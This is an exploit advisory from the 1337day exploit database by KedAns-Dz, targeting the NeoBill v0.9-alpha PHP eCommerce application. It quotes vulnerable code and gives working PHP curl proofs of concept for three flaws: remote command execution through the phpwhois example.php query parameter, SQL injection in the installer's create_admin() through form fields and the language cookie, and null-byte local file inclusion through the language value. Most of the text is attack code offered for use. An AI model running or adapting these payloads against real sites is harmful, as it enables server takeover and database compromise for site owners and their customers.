/*
1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /&#039; \            __  /&#039;__`\        /\ \__  /&#039;__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /&#039; _ `\ \/\ \/_/_\_<_  /&#039;___\ \ \/\ \ \ \ \/\`&#039;__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : 1337day.com                                   0
1  [+] Support e-mail  : submit[at]1337day.com                         1
0                                                                      0
1               #########################################              1
0               I&#039;m KedAns-Dz member from Inj3ct0r Team                1
1               #########################################              0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1

[>] Title : NeoBill v0.9-alpha eCommerce <= (RCE/SQLi/LFI) Vulnerabilities

[>] Author : KedAns-Dz
[+] E-mail : ked-h (@hotmail.com / @1337day.com)
[+] FaCeb0ok : fb.me/Inj3ct0rK3d
[+] TwiTter : @kedans

[#] Platform : PHP / WebApp
[+] Cat/Tag : Multiple , Code Exec , SQL Inject , File Include

[<] <3 <3 Greetings t0 Palestine <3 <3

*/

#***** [!] Description:
/*

> NeoBill v0.9-alpha is suffer from multiple vulnerabilities :
  - RCE : in module ( nullregistrar/phpwhois )
  - SQLi / LFI : some files in install !
  * you can get/find install folder/path and exploit it 
  even if the website install ( u can&#039;t re-install ) but
 you can exploit the SQLi or the LFI there *_^ .  

> ! : it&#039;s free exploit/p.o.c & pene-test for IT security

*/
#===== BUG (1) : [ Remote Code Exec ] =====>
/* 

 - function showhtml()
 # in file : ( whois.utils.php ) /&&/ ( example.php ) 
 # lines : ( 150 , 136 ) /&&/ ( 34 , 35 )

if (isSet($_GET[&#039;query&#039;])) {
$query = $_GET[&#039;query&#039;];

function showhtml($result, $link_myself = true, $params = &#039;query=$0&amp;output=nice&#039;)

 # require:
 function showhtml($result, $link_myself = true, $params = &#039;query=$0&amp;output=nice&#039;)

*/

#--- Exploit (1) P.O.C : -----
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://[target]/modules/nullregistrar/phpwhois/example.php?query=[CMD]");
curl_setopt($ch, CURLOPT_HTTPGET, 1);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)");
$buf = curl_exec ($ch);
curl_close($ch);
unset($ch);
echo $buf;
#---------------------------------

#===== BUG (2) : [ Multiple SQL Injection ] =====>

// Try to find install PATH/DIR is so vulnerable :p
/*

 - function create_admin()
 # in file : (install/include/solidstate.php)
 # lines : ( 178 , 168 , 162 , 169 , 163 , 172 , 166 , 160 , 167 ..)

mysql_query("INSERT INTO `user` (`username`, `password`, `type`, `contactname`, `email`, `language`) 
VALUES (&#039;$username&#039;, &#039;$password&#039;, &#039;Administrator&#039;, &#039;$contactname&#039;, &#039;$email&#039;, &#039;{$_COOKIE[&#039;language&#039;]}&#039;);")

$username = addslashes($_POST[&#039;username&#039;]);
$username = $_POST[&#039;username&#039;];
$password = md5($_POST[&#039;password-1&#039;]);
$password = md5(stripslashes($_POST[&#039;password-1&#039;])); 
$contactname = $firstname . &#039; &#039; . $lastname; 
$firstname = addslashes($_POST[&#039;firstname&#039;]);
$firstname = $_POST[&#039;firstname&#039;];
$lastname = addslashes($_POST[&#039;lastname&#039;]);

*/
#--- Exploit (2) P.O.C : -----
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://[target]/install/include/solidstate.php");
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)");
curl_setopt($ch, CURLOPT_POSTFIELDS, "username=&#039;[SQLi]&firstname=&#039;[SQLi]&email=&#039;[SQLi]"); // or inject in only one ;)
curl_setopt($ch, CURLOPT_COOKIE, "language=&#039;[SQLi]"); // SQLi via Cookie
curl_setopt($ch, CURLOPT_COOKIEJAR, "/tmp/cookie_[target]"); // add cookie-jar header to exploit it ^^
$buf = curl_exec ($ch);
curl_close($ch);
unset($ch);
echo $buf;

# note : the same exploit in other functions : create_company() 

#---------------------------------

#===== BUG (3) : [ Local File Include ] ====>

/*

 # in file : (install/index.php)
 # lines : ( 35 , 36 , 37 , 38)

require_once require_once &#039;languages/&#039; . $_POST[&#039;language&#039;] . &#039;.php&#039;; 
if(isset($_POST[&#039;language&#039;]))

require_once &#039;languages/&#039; . $_COOKIE[&#039;language&#039;] . &#039;.php&#039;; 
if(isset($_COOKIE[&#039;language&#039;]))



*/
#--- Exploit (3) P.O.C : -----
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://[target]/install/index.php");
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "language=[LFI]%00"); // LFI 1
curl_setopt($ch, CURLOPT_COOKIE, "language=[LFI]%00"); // LFI 2 ( via cookie ^^ )
curl_setopt($ch, CURLOPT_COOKIEJAR, "/tmp/cookie_[target]");
$buf = curl_exec ($ch);
curl_close($ch);
unset($ch);
echo $buf;
#---------------------------------

####
#<! THE END ^_* ! , Good Luck all <3 | 1337-DAY Aint DIE ^_^  !>
#<+ Proof Of Concept & Exploit Hunted by : Khaled [KedAns-Dz] +>
#<+ Copyright Â© 2013 Inj3ct0r Team | 1337day Exploit Database +>
# ** Greetings : < Dz Offenders Cr3w [&] Algerian Cyber Army > *
# ** ! Hassi Messaoud <3 1850 Hood <3 , Dedicate fr0m Algeria **
#---------------------------------------------------------------
# Greetings to my Homies : Indoushka , Caddy-Dz , Kalashinkov3 ,
# Chevr0sky , Mennouchi.Islem , KinG Of PiraTeS , TrOoN , T0xic,
# & Jago-dz , Over-X , Kha&miX , Ev!LsCr!pT_Dz , Barbaros-DZ , &
# & r0073r , KeyStr0ke , JF , Sid3^effectS , r4dc0re , CrosS , &
# & KnocKout , Angel Injection , The Black Divels , kaMtiEz  , &
# & Evil-Dz , Elite_Trojan , MalikPc , Marvel-Dz , Shinobi-Dz, &
# =( packetstormsecurity.org * metasploit.com * OWASP & OSVDB )=
####
?>

